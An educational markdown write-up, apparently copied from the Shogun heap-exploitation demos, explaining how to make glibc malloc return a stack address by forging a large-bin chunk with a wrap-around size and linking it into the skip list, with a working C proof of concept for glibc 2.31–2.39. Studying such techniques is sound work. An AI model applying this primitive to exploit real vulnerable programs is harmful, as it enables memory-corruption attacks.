<details>
<summary><strong>Description</strong></summary>
<p>

 we will again be trying to allocate a chunk off of the stack. However, we will be doing so via leveraging the large bin's skip list...
 > i dont know if this's helpful but since shogun added it, i will do (copy) that too...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled in glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk0, *chunk1, stack_array[20], *reallocate_chunk;

    // so this time around, again we will be trying to get malloc to allocate a stack ptr, this time, we will be leveraging the large bin skiplist
    // however, we will be doing things a little differently this time
    // similar to the previous instances , we will be making a fake chunk
    // except this time, we will set the size to 0xfffffffffffffff0
    // this would cause the address of the next chunk to wrap around, and legit be the 0x10 bytes before our fake chunk header
    // this would make it extremely convenient, to pass the sizeof(fake_chunk) == prev_size(next_chunk_after_fake_chunk)

    // allocate two big different size chunks
    chunk0 = malloc(0x440);
    malloc(0x18); // padding chunk to prevent consolidation
    chunk1 = malloc(0x450);
    malloc(0x18); // padding chunk to prevent consolidation

    free(chunk0); // insert them into the unsorted bin
    free(chunk1);

    // malloc a chunk, larger than any other unsorted bin chunks to move the two chunks over to the large bin
    // since they are different sizes, they will both end up in the skip list
    malloc(0x450 + 0x10);

    // now to create our fake chunk
    // first we will start off with the fake chunk's size, and prev_size
    // the size will be 0xfffffffffffffff0 (prev_inuse set) and prev_size will be 0x00
    // stack_array[10] = 0x0000000000000000; // fake chunk's prev_size (usually we dont need to care about this)
    stack_array[11] = 0xfffffffffffffff1; // fake chunk's size

    // now for the chunk header after our fake chunk
    // since the size of the chunk is 0xfffffffffffffff0
    // and this is a 64 bit architecture, it will legit wrap around, and be the previous 0x10 bytes
    // the prev_size we will set to `0xfffffffffffffff0` and the size we willset to `0x40` (I don't know if the chunk size matters here)
    stack_array[8] = 0xfffffffffffffff0; // Next chunk after fake chunk prev_size
    stack_array[9] = 0x0000000000000041; // and chunk size

    // so we have made our fake large bin chunk,
    // time to link it into the large bin, both the doubly linked list, and the skip list
    // however, there is one thing to take note of
    // the skiplist iteration will iterate, from the smallest chunk to the largest, this way, it should find "the best fit"
    // as long as none of the chunks prior to it in the skip list are large enough
    // for the allocation, it will guarantee our fake largebin chunk gets allocated

    // so let's go and link our fake chunk into the large bin, and skip list
    // starting with our fake chunk
    stack_array[12] = ((long)chunk0 - 0x10); // set our fake chunk's fwd
    stack_array[13] = ((long)chunk1 - 0x10); // set our fake chunk's bk
    stack_array[14] = ((long)chunk0 - 0x10); // set our fwd_nextsize
    stack_array[15] = ((long)chunk1 - 0x10); // set our bk_nextsize

    // now we will insert our fake chunk, in between the two large bin chunks
    // for both the doubly linked list, and skip list
    chunk0[1] = (long)(&stack_array[10]); // bk
    chunk0[3] = (long)(&stack_array[10]); // bk_nextsize
    chunk1[0] = (long)(&stack_array[10]); // fwd
    chunk1[2] = (long)(&stack_array[10]); // fwd_nextsize

    // now, all that is left to do, is call malloc with a size that will get us our fake chunk
    reallocate_chunk = malloc(0x450);
    printf("reallocate_chunk: %p\n", reallocate_chunk);

    /* one thing to note here. While this will give us a fake stack chunk, we have the remainder to deal with
    when a large bin chunk that is being allocated that is sufficiently larger than the allocation size
    it will split the chunk into two, and the leftover potion will be the remainder, the remainder will be inserted into the unsorted bin
    due to the huge size of the remainder here, it will cause problems and fail checks if malloc looks at it for allocation of the new unsorted bin chunk
    so we have to be careful about how we call malloc after this, also, this exact method may not be possible in future libc versions, as what checks are done changes
    */

    printf("becareful for the next allocation, depending on what happens, this can cause problems!!!\n");
    // e.g.
    // malloc(0x450); // this will cause error
}
```

</p>
</details>

<details>
<summary><strong>Explain</strong></summary>
<p>

> copy straight from shogun

Similar to a lot of the other walkthroughs, we will be making a fake chunk, and leveraging a particular functionality of the glibc heap to allocate it. One thing that has been annoying to do, for a lot of the main_arena bins, is the check size(fake_chunk) == prev_size(next_chunk_after_our_fake_chunk). This would cause us to not only have to make a fake chunk, but another fake chunk header after our first fake chunk. How we do things here, makes that a bit easier.

This is a 64 bit system. So, if we add two numbers together, wich their result leads to a value that needs more than 64 bits to store, it will in many situations just keep the lower 64 bits. We will use this to our advantage.

In a 64 bit system, if you add 0xfffffffffffffff0 to a memory address, the sum will basically be the 0x10 minus the memory address. Let's say the address is 0x00007ffffffde000. This is because 0x00007ffffffde000 + 0xfffffffffffffff0 = 0x100007ffffffddff0 and hex(0x100007ffffffddff0 & 0xffffffffffffffff) = 0x7ffffffddff0, and 0x00007ffffffde000 - 0x10 = 0x7ffffffddff0.

As such, if we make the size of our fake chunk to be 0xfffffffffffffff0, then the chunk header of the next chunk should legit be the previous 0x10 bytes before our fake chunk header. This will make it way more convenient to pass those checks.

As for linking it into the large bin, since we are specifically using the skip list here, we will need to link it both into the doubly linked main arena list, and the skiplist (total of 4 ptrs for the fake chunk, and 2 for each chunk we link it against).

Now for linking it against the skip list. Having a size of 0xfffffffffffffff0 will be extremely beneficial. Since the size values are unsigned, we're basically guaranteed that our chunk will be the largest. As such, as long as the previous chunks in the skip list won't meet the required size, it will choose our chunk.

Doing it this way will also yield one problem. When a large bin chunk is allocated that is larger than the requested size, the remainder will get carved out into a new chunk, and inserted into the unsorted bin. That will certainly happen here. That unsorted bin chunk, if malloc tries to look at it for future allocations, will not pass certain checks, and cause the program to crash. In addition to that, as what checks malloc does changes, this whole thing might not even be possible in future glibc versions.

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/large_bin/skiplist/readme.md

</p>
</details>